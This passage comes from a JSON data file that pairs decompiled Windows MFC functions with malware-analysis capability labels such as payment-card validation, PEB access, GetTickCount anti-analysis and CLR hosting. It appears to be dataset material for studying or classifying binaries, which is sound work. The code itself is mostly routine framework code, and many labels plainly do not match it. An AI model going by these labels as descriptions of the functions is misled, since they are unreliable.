        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0041a2b4(void)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    uint32_t uVar5;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004077f4();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CWinApp.0;\n    piVar1 = extraout_ECX[0x20];\n    *(unaff_EBP + -4) = 0;\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 4))(1);\n    }\n    if (extraout_ECX[0x2a] != NULL) {\n        (**(*extraout_ECX[0x2a] + 0x14))(1);\n    }\n    iVar3 = fcn.0041ab50();\n    if (*(iVar3 + 0x14) == '\\0') {\n        if (*0x42de54 != NULL) {\n            (**(**0x42de54 + 4))(1);\n            *0x42de54 = NULL;\n        }\n        if (*0x42de50 != NULL) {\n            (**(**0x42de50 + 4))(1);\n            *0x42de50 = NULL;\n        }\n    }\n    if (extraout_ECX[0x25] != NULL) {\n        fcn.00419abb(extraout_ECX[0x25]);\n    }\n    pcVar4 = extraout_ECX[0x26];\n    if (pcVar4 != NULL) {\n        pcVar4 = fcn.00419abb(pcVar4);\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_GlobalDeleteAtom;\n    uVar5 = pcVar4 & 0xffff0000 | *(extraout_ECX + 0x2c);\n    if (*(extraout_ECX + 0x2c) != 0) {\n        uVar5 = (*_sym.imp.KERNEL32.dll_GlobalDeleteAtom)(uVar5);\n    }\n    if (*(extraout_ECX + 0xb2) != 0) {\n        (*pcVar2)(uVar5 & 0xffff0000 | *(extraout_ECX + 0xb2));\n    }\n    if (extraout_ECX[0x2b] != NULL) {\n        (**(*extraout_ECX[0x2b] + 4))(1);\n    }\n    iVar3 = fcn.0041ab50();\n    if (*(iVar3 + 0x10) == extraout_ECX[0x1e]) {\n        *(iVar3 + 0x10) = 0;\n    }\n    if (*(iVar3 + 4) == extraout_ECX) {\n        *(iVar3 + 4) = 0;\n    }\n    fcn.0040795e(extraout_ECX[0x1e]);\n    fcn.0040795e(extraout_ECX[0x1f]);\n    fcn.0040795e(extraout_ECX[0x22]);\n    fcn.0040795e(extraout_ECX[0x23]);\n    fcn.0040795e(extraout_ECX[0x24]);\n    *(unaff_EBP + -4) = 0xffffffff;\n    extraout_ECX[10] = NULL;\n    fcn.0041bb48();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 850
    },
    "0041ab76": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041ab76(void)\n\n{\n    fcn.0041ab50();\n    fcn.0041b34f(0x41a47c);\n    return;\n}\n",
        "token_count": 42
    },
    "0041baf8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0041baf8(void)\n\n{\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004077f4();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable._AFX_WIN_STATE.0;\n    *(unaff_EBP + -4) = 0;\n    fcn.00419aa2(extraout_ECX + 1, extraout_ECX);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 171
    },
    "0041bba1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "set application hook"
        ],
        "decompiled_code": "\nvoid fcn.0041bba1(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    char *arg_8h;\n    \n    iVar2 = fcn.0041ab50();\n    fcn.0041b683(1);\n    arg_8h = iVar2 + 0x34;\n    while (*arg_8h != '\\0') {\n        puVar3 = fcn.00407ec2(arg_8h, 10);\n        *puVar3 = 0;\n        iVar4 = fcn.0041ab50();\n        (*_sym.imp.USER32.dll_UnregisterClassA)(arg_8h, *(iVar4 + 8));\n        arg_8h = puVar3 + 1;\n    }\n    *(iVar2 + 0x34) = '\\0';\n    fcn.0041b6f3(1);\n    iVar2 = fcn.0041ab50();\n    if ((*(iVar2 + 4) != 0) && (pcVar1 = *(*(iVar2 + 4) + 0x54),  pcVar1 != NULL)) {\n        (*pcVar1)(1, 0);\n    }\n    iVar2 = fcn.0041a923();\n    if (*(iVar2 + 0xcc) != NULL) {\n        iVar4 = (**(**(iVar2 + 0xcc) + 0xb8))();\n        if (iVar4 != 0) {\n            *(iVar2 + 0xcc) = 0;\n        }\n    }\n    iVar4 = fcn.0041ab50();\n    pcVar1 = _sym.imp.USER32.dll_UnhookWindowsHookEx;\n    if (*(iVar4 + 0x14) == '\\0') {\n        if (*(iVar2 + 0x30) != 0) {\n            (*_sym.imp.USER32.dll_UnhookWindowsHookEx)(*(iVar2 + 0x30));\n            *(iVar2 + 0x30) = 0;\n        }\n        if (*(iVar2 + 0x2c) != 0) {\n            (*pcVar1)(*(iVar2 + 0x2c));\n            *(iVar2 + 0x2c) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 504
    },
    "00401352": {
        "rules": [
            "PEB access"
        ],
        "decompiled_code": "\nuint fcn.00401352(void)\n\n{\n    int32_t in_FS_OFFSET;\n    uint var_4h;\n    \n    return *(in_FS_OFFSET + 0x30);\n}\n",
        "token_count": 40
    },
    "00405363": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405363(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint *in_FS_OFFSET;\n    uint var_6ch;\n    uint var_68h;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x41bcdb;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    if ((arg_8h & 0xfff0) == 0x10) {\n        fcn.004011c0();\n        var_4h = 0;\n        fcn.00415470();\n        var_4h = 0xffffffff;\n        fcn.00405810();\n    }\n    else {\n        fcn.004064b0(arg_8h, arg_ch);\n    }\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 204
    },
    "00418a99": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_14h\n\nuint fcn.00418a99(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004077f4();\n    uVar2 = 0;\n    iVar1 = *(extraout_ECX + 0xc);\n    *(unaff_EBP + -0x10) = &var_14h;\n    if (iVar1 != 0) {\n        *(unaff_EBP + -0x14) = 0;\n        *(unaff_EBP + -4) = 0;\n        uVar2 = (**(extraout_ECX + 0xc))();\n        *(unaff_EBP + -0x14) = uVar2;\n        uVar2 = *(unaff_EBP + -0x14);\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 272
    },
    "00419947": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nbool fcn.00419947(void)\n\n{\n    uint32_t uVar1;\n    uint var_4h;\n    uchar auStack32 [12];\n    code *pcStack20;\n    int32_t iVar2;\n    uint32_t uStack8;\n    \n    iVar2 = 0x4208f8;\n    uStack8 = 0x42f8f8;\n    pcStack20 = fcn.00419960;\n    fcn.00407fe5(&uStack8, 0x4208f8);\n    if ((iVar2 != 0) &&\n       (pcStack20 = &stack0xfffffffc,  uVar1 = (*_sym.imp.USER32.dll_GetWindowLongA)(iVar2, 0xfffffff0), \n       (uVar1 & 0xf) == uStack8)) {\n        (*_sym.imp.USER32.dll_GetClassNameA)(iVar2, auStack32, 10);\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(auStack32, \"combobox\");\n        return iVar2 == 0;\n    }\n    return false;\n}\n",
        "token_count": 243
    },
    "00419a4a": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get graphical window text"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00419a4a(uint hWnd, uint lpString2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint lpString1;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString2);\n    if (((uVar1 < 0x101) && (uVar2 = (*_sym.imp.USER32.dll_GetWindowTextA)(hWnd, &lpString1, 0x100),  uVar2 == uVar1))\n       && (iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(&lpString1, lpString2),  iVar3 == 0)) {\n        return;\n    }\n    (*_sym.imp.USER32.dll_SetWindowTextA)(hWnd, lpString2);\n    return;\n}\n",
        "token_count": 186
    },
    "0041b8ef": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nbool fcn.0041b8ef(void)\n\n{\n    uint uVar1;\n    uint32_t var_14h;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_GetOEMCP)(&var_14h);\n    (*_sym.imp.KERNEL32.dll_GetCPInfo)(uVar1);\n    return 1 < var_14h;\n}\n",
        "token_count": 81
    },
    "00413f94": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00413f94(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    *(param_1 + 0xc) = 1;\n    iVar1 = fcn.0041895b(*(param_1 + 0x94), param_1 + 0x14, 0x80);\n    *(param_1 + 0x10) = iVar1 != 0;\n    return;\n}\n",
        "token_count": 98
    },
    "00414000": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00414000(void)\n\n{\n    int32_t extraout_ECX;\n    uint var_4h;\n    uint uStack24;\n    code *pcStack20;\n    uint uStack8;\n    \n    uStack8 = 0x42fae8;\n    pcStack20 = fcn.00414019;\n    fcn.00407fe5(&uStack8, 0x420a90);\n    uStack24 = 0x42fa50;\n    pcStack20 = &stack0xfffffffc;\n    fcn.00407fe5(&uStack24, 0x420ad8);\n    *(extraout_ECX + 0xc) = 0;\n    *(extraout_ECX + 0x10) = 0;\n    *(extraout_ECX + 8) = 0;\n    *(extraout_ECX + 4) = 0;\n    fcn.004140af();\n    *(extraout_ECX + 0x14) = 0;\n    return;\n}\n",
        "token_count": 222
    },
    "00414019": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00414019(void)\n\n{\n    int32_t extraout_ECX;\n    uint var_4h_2;\n    \n    var_4h_2 = 0x42fa50;\n    fcn.00407fe5(&var_4h_2, 0x420ad8);\n    *(extraout_ECX + 0xc) = 0;\n    *(extraout_ECX + 0x10) = 0;\n    *(extraout_ECX + 8) = 0;\n    *(extraout_ECX + 4) = 0;\n    fcn.004140af();\n    *(extraout_ECX + 0x14) = 0;\n    return;\n}\n",
        "token_count": 155
    },
    "00414032": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414032(int32_t param_1)\n\n{\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 8) = 0;\n    *(param_1 + 4) = 0;\n    fcn.004140af();\n    *(param_1 + 0x14) = 0;\n    return;\n}\n",
        "token_count": 100
    },
    "004140c5": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004140c5(code **param_1, code *param_2)\n\n{\n    param_1[1] = NULL;\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[5] = NULL;\n    *param_1 = vtable.CMapPtrToPtr.0;\n    param_1[2] = 0x11;\n    param_1[6] = param_2;\n    return;\n}\n",
        "token_count": 110
    },
    "0041414d": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041414d(int32_t param_1)\n\n{\n    if (*(param_1 + 4) != 0) {\n        fcn.00415cc6(*(param_1 + 4));\n        *(param_1 + 4) = 0;\n    }\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    fcn.004140af();\n    *(param_1 + 0x14) = 0;\n    return;\n}\n",
        "token_count": 121
    },
    "00414b12": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414b12(int32_t param_1)\n\n{\n    *(param_1 + 4) = 1;\n    *(param_1 + 8) = 0;\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0x14) = 1;\n    *(param_1 + 0x18) = 0;\n    return;\n}\n",
        "token_count": 108
    },
    "00414e04": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414e04(code **param_1)\n\n{\n    *param_1 = vtable.CCmdUI.0;\n    param_1[8] = NULL;\n    param_1[2] = NULL;\n    param_1[1] = NULL;\n    param_1[9] = NULL;\n    param_1[4] = NULL;\n    param_1[3] = NULL;\n    param_1[5] = NULL;\n    param_1[7] = NULL;\n    param_1[6] = NULL;\n    return;\n}\n",
        "token_count": 126
    },
    "0041a6b8": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint fcn.0041a6b8(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if (*0x42fddc == 0) {\n        iVar2 = fcn.0041b3e4(0x41a572);\n        if (*(iVar2 + 4) == 0) {\n            *(iVar2 + 0xc) = 0x40ef00;\n            *(iVar2 + 0x10) = 0x40ef70;\n            *(iVar2 + 0x14) = fcn.0040f030;\n            *(iVar2 + 0x18) = 0x40f1b0;\n            *(iVar2 + 0x1c) = 0x40f650;\n            *(iVar2 + 0x20) = 0x40f550;\n            *(iVar2 + 0x24) = fcn.0040f930;\n            *(iVar2 + 0x28) = 0x40f250;\n            *(iVar2 + 0x2c) = 0x40f390;\n            iVar3 = fcn.0041ab50();\n            iVar3 = (**(iVar2 + 0xc))(*(iVar3 + 8));\n            if (iVar3 == 0) {\n                *(iVar2 + 0xc) = 0;\n                *(iVar2 + 0x10) = 0;\n                *(iVar2 + 0x14) = 0;\n                *(iVar2 + 0x18) = 0;\n                *(iVar2 + 0x1c) = 0;\n                *(iVar2 + 0x20) = 0;\n                *(iVar2 + 0x24) = 0;\n                *(iVar2 + 0x28) = 0;\n                *(iVar2 + 0x2c) = 0;\n            }\n            *(iVar2 + 4) = 1;\n        }\n        if (*(iVar2 + 0x14) == 0) {\n            uVar1 = 0;\n        }\n        else {\n            iVar3 = fcn.0041ab50();\n            uVar1 = (**(iVar2 + 0x14))(*(iVar3 + 8));\n        }\n    }\n    else {\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 522
    },
    "0041a954": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041a954(code **param_1, uchar param_2)\n\n{\n    param_1[7] = NULL;\n    param_1[8] = NULL;\n    param_1[9] = NULL;\n    param_1[10] = NULL;\n    param_1[0x40f] = NULL;\n    param_1[0x410] = NULL;\n    param_1[0x413] = 0xffffffff;\n    param_1[0x414] = NULL;\n    param_1[0x419] = NULL;\n    param_1[0x41a] = NULL;\n    *param_1 = vtable.AFX_MODULE_STATE.0;\n    param_1[10] = 0x1c;\n    param_1[8] = 0x14;\n    param_1[6] = NULL;\n    *(param_1 + 5) = param_2;\n    param_1[0xc] = 0x1;\n    param_1[0x410] = 0x18;\n    return;\n}\n",
        "token_count": 239
    },
    "004145e6": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004145e6(int32_t *param_1)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iStack4;\n    \n    bVar1 = true;\n    iStack4 = 0;\n    do {\n        if (bVar1) {\n            do {\n                iVar2 = (*_sym.imp.USER32.dll_PeekMessageA)(param_1 + 0xc, 0, 0, 0, 0);\n                if (iVar2 != 0) break;\n                iVar2 = iStack4 + 1;\n                iVar3 = (**(*param_1 + 0x60))(iStack4);\n                if (iVar3 == 0) {\n                    bVar1 = false;\n                }\n                iStack4 = iVar2;\n            } while (bVar1);\n        }\n        do {\n            iVar2 = (**(*param_1 + 0x5c))();\n            if (iVar2 == 0) {\n                (**(*param_1 + 0x68))();\n                return;\n            }\n            iVar2 = (**(*param_1 + 100))(param_1 + 0xc);\n            if (iVar2 != 0) {\n                bVar1 = true;\n            }\n            iVar2 = (*_sym.imp.USER32.dll_PeekMessageA)(param_1 + 0xc, 0, 0, 0, 0);\n        } while (iVar2 != 0);\n    } while( true );\n}\n",
        "token_count": 335
    },
    "0041925e": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nuint fcn.0041925e(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    uVar4 = 0xffffffff;\n    piVar2 = fcn.0041455d();\n    iVar3 = fcn.0041ab50();\n    piVar1 = *(iVar3 + 4);\n    iVar3 = fcn.0041b922(param_1, param_2, param_3, param_4);\n    if ((iVar3 != 0) && ((piVar1 == NULL || (iVar3 = (**(*piVar1 + 0x84))(),  iVar3 != 0)))) {\n        iVar3 = (**(*piVar2 + 0x50))();\n        if (iVar3 == 0) {\n            if (piVar2[7] != NULL) {\n                (**(*piVar2[7] + 0x58))();\n            }\n            uVar4 = (**(*piVar2 + 0x68))();\n        }\n        else {\n            uVar4 = (**(*piVar2 + 0x54))();\n        }\n    }\n    fcn.0041bba1();\n    return uVar4;\n}\n",
        "token_count": 293
    },
    "0041b4a6": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0041b4a6(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    var_4h = 0;\n    var_8h = 0;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(0x80000001, \"software\", 0, 0x2001f, &var_4h);\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegCreateKeyExA;\n    if (iVar2 == 0) {\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)\n                          (var_4h, *(param_1 + 0x7c), 0, 0, 0, 0x2001f, 0, &var_8h, &var_10h);\n        if (iVar2 == 0) {\n            (*pcVar1)(var_8h, *(param_1 + 0x90), 0, 0, 0, 0x2001f, 0, &var_ch, &var_10h);\n        }\n    }\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegCloseKey;\n    if (var_4h != 0) {\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_4h);\n    }\n    if (var_8h != 0) {\n        (*pcVar1)(var_8h);\n    }\n    return var_ch;\n}\n",
        "token_count": 384
    },
    "0041b53a": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041b53a(uint lpSubKey)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    iVar1 = fcn.0041b4a6();\n    if (iVar1 == 0) {\n        var_4h = 0;\n    }\n    else {\n        (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)(iVar1, lpSubKey, 0, 0, 0, 0x2001f, 0, &var_4h, &var_8h);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(iVar1);\n    }\n    return var_4h;\n}\n",
        "token_count": 168
    },
    "004140af": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004140af(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    \n    if (param_1 != NULL) {\n        do {\n            piVar1 = *param_1;\n            fcn.00415cc6(param_1);\n            param_1 = piVar1;\n        } while (piVar1 != NULL);\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "00414207": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.00414207(int32_t param_1, uint32_t param_2, uint32_t *param_3)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    \n    uVar2 = (param_2 >> 4) % *(param_1 + 8);\n    *param_3 = uVar2;\n    if (*(param_1 + 4) != 0) {\n        for (puVar1 = *(*(param_1 + 4) + uVar2 * 4); puVar1 != NULL; puVar1 = *puVar1) {\n            if (puVar1[1] == param_2) {\n                return puVar1;\n            }\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 170
    },
    "00414239": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00414239(int32_t param_1, uint32_t param_2)\n\n{\n    uint *puVar1;\n    \n    if (*(param_1 + 4) != 0) {\n        for (puVar1 = *(*(param_1 + 4) + ((param_2 >> 4) % *(param_1 + 8)) * 4); puVar1 != NULL; puVar1 = *puVar1) {\n            if (puVar1[1] == param_2) {\n                return puVar1[2];\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 138
    },
    "004142bc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __thiscall fcn.004142bc(int32_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    \n    iVar1 = *(param_1 + 4);\n    if (iVar1 != 0) {\n        uVar4 = (param_2 >> 4) % *(param_1 + 8);\n        puVar2 = *(iVar1 + uVar4 * 4);\n        puVar5 = iVar1 + uVar4 * 4;\n        while (puVar3 = puVar2,  puVar3 != NULL) {\n            if (puVar3[1] == param_2) {\n                *puVar5 = *puVar3;\n                fcn.004141ee(puVar3);\n                return 1;\n            }\n            puVar5 = puVar3;\n            puVar2 = *puVar3;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 231
    },
    "00415c9d": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00415c9d(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = fcn.00407f59(param_1);\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        if (*0x42c8c0 == NULL) break;\n        iVar1 = (**0x42c8c0)(param_1);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 121
    },
    "00416bde": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00416bde(int32_t param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar1 = (*_sym.imp.USER32.dll_GetMenuItemCount)(*(param_1 + 4));\n    iVar4 = 0;\n    if (0 < iVar1) {\n        do {\n            uVar2 = (*_sym.imp.USER32.dll_GetSubMenu)(*(param_1 + 4), iVar4);\n            iVar3 = fcn.004189f4(uVar2);\n            if (iVar3 == 0) {\n                iVar3 = (*_sym.imp.USER32.dll_GetMenuItemID)(*(param_1 + 4), iVar4);\n                if (iVar3 == param_1) {\n                    iVar1 = fcn.00418a09(*(param_1 + 4));\n                    return iVar1;\n                }\n            }\n            else {\n                iVar3 = fcn.00416bde(iVar3, param_3);\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < iVar1);\n    }\n    return 0;\n}\n",
        "token_count": 284
    },
    "004175ae": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.004175ae(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetParent;\n    if ((param_1 != 0) && (iVar4 = *(param_1 + 0x1c),  iVar4 != 0)) {\n        while( true ) {\n            uVar2 = (*pcVar1)(iVar4);\n            piVar3 = fcn.0041617d(uVar2);\n            if (piVar3 == NULL) break;\n            iVar4 = (**(*piVar3 + 0xb0))();\n            if (iVar4 != 0) {\n                return piVar3;\n            }\n            iVar4 = piVar3[7];\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 198
    },
    "00417631": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00417631(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if ((param_1 != 0) && (iVar1 = *(param_1 + 0x1c),  *(param_1 + 0x1c) != 0)) {\n        do {\n            iVar3 = iVar1;\n            iVar1 = fcn.004175ec(iVar3);\n        } while (iVar1 != 0);\n        uVar2 = fcn.0041617d(iVar3);\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 146
    },
    "0041769a": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041769a(uint hDlg, uint nIDDlgItem, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.USER32.dll_GetDlgItem)(hDlg, nIDDlgItem);\n    pcVar1 = _sym.imp.USER32.dll_GetTopWindow;\n    if (iVar2 != 0) {\n        iVar3 = (*_sym.imp.USER32.dll_GetTopWindow)(iVar2);\n        if ((iVar3 != 0) && (iVar3 = fcn.0041769a(iVar2, nIDDlgItem, arg_10h),  iVar3 != 0)) {\n            return iVar3;\n        }\n        if (arg_10h == 0) {\n            iVar2 = fcn.0041617d();\n            return iVar2;\n        }\n        iVar2 = fcn.004161a4(iVar2);\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n    }\n    iVar2 = (*pcVar1)(hDlg);\n    while( true ) {\n        if (iVar2 == 0) {\n            return 0;\n        }\n        iVar3 = fcn.0041769a(iVar2, nIDDlgItem, arg_10h);\n        if (iVar3 != 0) break;\n        iVar2 = (*_sym.imp.USER32.dll_GetWindow)(iVar2, 2);\n    }\n    return iVar3;\n}\n",
        "token_count": 333
    },
    "00417c73": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00417c73(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint var_1ch;\n    \n    pcVar1 = _sym.imp.USER32.dll_PeekMessageA;\n    while( true ) {\n        iVar2 = (*pcVar1)(&var_1ch, 0, 0x121, 0x121, 1);\n        if (iVar2 == 0) break;\n        (*_sym.imp.USER32.dll_DispatchMessageA)(&var_1ch);\n    }\n    fcn.004160e4();\n    return;\n}\n",
        "token_count": 133
    },
    "004199d5": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004199d5(int32_t hWnd, uint lpPoint, uint arg_10h)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint lpRect;\n    \n    (*_sym.imp.USER32.dll_ClientToScreen)(hWnd, &lpPoint);\n    pcVar1 = _sym.imp.USER32.dll_GetWindow;\n    uVar5 = 5;\n    do {\n        hWnd = (*pcVar1)(hWnd, uVar5);\n        if (hWnd == 0) {\n            return 0;\n        }\n        iVar2 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(hWnd);\n        if ((iVar2 != -1) &&\n           (uVar3 = (*_sym.imp.USER32.dll_GetWindowLongA)(hWnd, 0xfffffff0),  (uVar3 & 0x10000000) != 0)) {\n            (*_sym.imp.USER32.dll_GetWindowRect)(hWnd, &lpRect);\n            iVar4 = (*_sym.imp.USER32.dll_PtInRect)(&lpRect, lpPoint, arg_10h);\n            if (iVar4 != 0) {\n                return hWnd;\n            }\n        }\n        uVar5 = 2;\n    } while( true );\n}\n",
        "token_count": 300
    },
    "00419e36": {
        "rules": [
            "contain loop"
        ],
